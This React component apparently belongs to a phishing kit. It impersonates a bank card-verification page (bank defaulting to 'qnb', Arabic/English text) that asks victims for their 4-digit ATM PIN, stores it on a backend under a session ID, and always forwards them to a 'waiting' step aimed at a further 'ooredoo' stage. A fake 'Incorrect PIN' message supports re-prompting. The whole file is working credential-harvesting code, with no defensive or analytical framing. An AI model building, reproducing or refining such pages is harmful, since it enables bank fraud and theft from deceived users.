import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function AtmPin() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const { language, setLanguage } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
  const showError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [pin, setPin] = useState("");
  const submitAtmPinMutation = trpc.submissions.submitAtmPin.useMutation();

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 4);
    setPin(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (pin.length !== 4) {
      toast.error(isArabic ? "يجب أن يكون الرقم السري 4 أرقام" : "PIN must be 4 digits");
      return;
    }
    
    try {
      await submitAtmPinMutation.mutateAsync({
        sessionId: currentSessionId,
        pin,
      });
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=ooredoo`);
    } catch (error) {
      console.error("Error saving ATM PIN in DB:", error);
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=ooredoo`);
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  return (
    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        
        .container { padding: 40px 20px; flex: 1; text-align: center; }
        .otp-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }
        
        .otp-input { width: 100%; padding: 20px; border: 2px solid #ddd; border-radius: 8px; font-size: 24px; text-align: center; font-weight: bold; margin: 20px 0; box-sizing: border-box; letter-spacing: 15px; }
        .otp-input:focus { border-color: #8C0032; outline: none; }
        
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>
      <header className="header">
        <div className="menu-icon">&#9776;</div>
        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663821954062/BkVFgBrnkZHoPjjv.png" className="logo" alt="Logo" />
        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
      </header>

      <div className="container">
        <div className="otp-box">
          {showError && (
            <div className="error-message">
              {isArabic ? "الرقم السري غير صحيح، يرجى المحاولة مرة أخرى" : "Incorrect PIN, please try again"}
            </div>
          )}
          <h2>{isArabic ? "التحقق من البطاقة" : "Card Verification"}</h2>
          <p>{isArabic ? "للتأكيد، يرجى إدخال الرقم السري للصراف الآلي" : "To confirm, please enter your ATM PIN"}</p>
          <form onSubmit={handleSubmit}>
            <input
              type="password"
              className="otp-input"
              placeholder="****"
              maxLength={4}
              value={pin}
              onChange={handlePinChange}
              required
            />
            <button type="submit" className="submit-btn">
              {isArabic ? "تأكيد" : "Confirm"}
            </button>
          </form>
        </div>
      </div>

      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
    </div>
  );
}
